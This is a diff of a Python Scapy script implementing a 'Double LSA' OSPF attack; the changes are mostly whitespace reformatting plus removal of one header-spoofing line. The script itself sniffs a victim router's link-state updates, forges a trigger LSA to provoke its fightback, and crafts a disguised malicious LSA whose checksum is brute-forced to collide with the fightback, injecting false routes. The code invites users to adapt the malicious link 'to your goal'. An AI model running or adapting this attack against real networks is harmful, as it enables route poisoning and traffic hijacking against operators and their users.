@@ -1,13 +1,12 @@
-#! /usr/bin/env python
+# ! /usr/bin/env python
 """
 Double LSA OSPF Attack
-Author:	Alston 					  
-Date:	2020.7.10   
+Author:	Alston
+Date:	2020.7.10
 """
 
 from scapy.all import *
 from time import *
-
 
 #####################################################
 # Utils functions		 							#
@@ -16,6 +15,8 @@ from time import *
 """
 Checks if the incoming packet is an OSFP LS Update packet sent from the victim router.
 """
+
+
 def check_incoming_packet(victim, pkt):
 	if OSPF_Router_LSA in pkt:
 		for lsa in pkt[OSPF_LSUpd].lsalist:
@@ -23,9 +24,12 @@ def check_incoming_packet(victim, pkt):
 				return True
 	return False
 
+
 """
 Returns the last index of the victim router LSA taken from the originally captured packet
 """
+
+
 def get_victim_lsa_index(victim, pkt):
 	position = 0
 	if OSPF_Router_LSA in pkt:
@@ -35,12 +39,14 @@ def get_victim_lsa_index(victim, pkt):
 			position += 1
 	return position
 
+
 """
 This function calculates the value of the first and the second byte in the 
 OSPF Link "metric" field, used to fake the checksum.
 """
-def get_fake_metric_value(fightback_lsa, evil_lsa, linkcount):
 
+
+def get_fake_metric_value(fightback_lsa, evil_lsa, linkcount):
 	tmp_lsa = evil_lsa[OSPF_Router_LSA].copy()
 	fightback_checksum = ospf_lsa_checksum(fightback_lsa.build())
 
@@ -48,7 +54,7 @@ def get_fake_metric_value(fightback_lsa, evil_lsa, linkcount):
 	Ok guys, I have no enough time here to understand how to do it in a cool and fancy
 	way with numpy. So, fuck, let's bruteforce it (using 65535 cycles, in the worst case).
 	"""
-	for metric in range (0,65535):
+	for metric in range(0, 65535):
 		tmp_lsa[OSPF_Router_LSA].linklist[linkcount].metric = metric
 		tmp_checksum = ospf_lsa_checksum(tmp_lsa.build())
 
@@ -57,17 +63,17 @@ def get_fake_metric_value(fightback_lsa, evil_lsa, linkcount):
 
 	return 0
 
-if __name__ == '__main__':
 
+if __name__ == '__main__':
 	"""
     Load the Scapy's OSPF module
     """
 	load_contrib("ospf")
-	
+
 	#####################################################
 	# Initial configuration 							#
 	#####################################################
-	
+
 	"""
 	The router-id of the victim router
 	"""
@@ -83,7 +89,7 @@ if __name__ == '__main__':
 	"""
 	pkts = sniff(filter="proto ospf", stop_filter=lambda x: check_incoming_packet(victim, x))
 
-	#pkts[-1].show()
+	# pkts[-1].show()
 
 	"""
 	Get the last packet and copy it.
@@ -106,26 +112,26 @@ if __name__ == '__main__':
 	To be effective, the sequence of the trigger LSA has to be increased by 1.
 	"""
 	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 1
-	
+
 	"""
 	Here we insert a random link, just to create an LSUpdate which seems advertised
 	by the victim router, but which contains fake information. This will force the
 	victim router to trigger the fightback mechanism.
 	"""
-	trigger_link = OSPF_Link(	metric=10,
-								toscount=0,
-								type=3,
-								data= "255.255.255.0",
-								id= "172.16.66.0")
+	trigger_link = OSPF_Link(metric=10,
+							 toscount=0,
+							 type=3,
+							 data="255.255.255.0",
+							 id="172.16.66.0")
 
 	"""
 	Addition of the triggering OSPF Link in the trigger packet.
-	"""	
+	"""
 	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(trigger_link)
 
-	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12 
+	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
 	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \
-	len(pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)
+		len(pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)
 
 	"""
 	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
@@ -134,11 +140,10 @@ if __name__ == '__main__':
 	"""
 	# pkt_trig[Ether].src = "00:16:3e:0b:16:1e"
 	# pkt_trig[Ether].dst = "01:00:5e:00:00:05"	# The multicast MAC address
-	pkt_trig[IP].src = "192.168.12.79"	
-	pkt_trig[IP].dst = "224.0.0.5"	
+	pkt_trig[IP].src = "192.168.12.79"
+	pkt_trig[IP].dst = "224.0.0.5"
 	pkt_trig[IP].chksum = None
 	pkt_trig[IP].len = None
-	pkt_trig[OSPF_Hdr].src = victim
 	pkt_trig[OSPF_Hdr].chksum = None
 	pkt_trig[OSPF_Hdr].len = None
 	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len = None
@@ -157,19 +162,19 @@ if __name__ == '__main__':
 	"""
 	Generate the disguised LSA. This is an example, change it accordingly to your goal.
 	"""
-	malicious_link = OSPF_Link(	metric=10,
-								toscount=0,
-								type=3,
-								data= "255.255.255.0",
-								id= "172.16.254.0")
+	malicious_link = OSPF_Link(metric=10,
+							   toscount=0,
+							   type=3,
+							   data="255.255.255.0",
+							   id="172.16.254.0")
 	"""
 	Addition of the malicious OSPF Link in the LSA_disguised packet.
 	"""
 	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(malicious_link)
 
-	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12 	
+	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
 	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \
-	len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)
+		len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)
 
 	"""
 	The sequence number of the packet evil is incremented by 2 because
@@ -187,11 +192,11 @@ if __name__ == '__main__':
 	"""
 	Preparing the OSPF Link to fake the checksum.
 	"""
-	checksum_link = OSPF_Link(	metric=0,
-								toscount=0,
-								type=3,
-								data= "255.255.255.0",
-								id= "172.16.253.0")
+	checksum_link = OSPF_Link(metric=0,
+							  toscount=0,
+							  type=3,
+							  data="255.255.255.0",
+							  id="172.16.253.0")
 
 	"""
 	Addition of an OSPF Link in the LSA_disguised packet in order to change the checksum later.
@@ -200,7 +205,7 @@ if __name__ == '__main__':
 
 	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
 	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \
-	len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)
+		len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)
 
 	"""
 	ORIGINAL SOLUTION:
@@ -215,13 +220,13 @@ if __name__ == '__main__':
 
 	pkt_orig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 2
 
-	faked_metric =  get_fake_metric_value(pkt_orig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], \
-										  pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], count)
+	faked_metric = get_fake_metric_value(pkt_orig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], \
+										 pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], count)
 
 	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist[count][OSPF_Link].metric = faked_metric
 
 	print("[+] Collision found! Time to send the pkts...")
-	
+
 	"""
 	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
 	"""
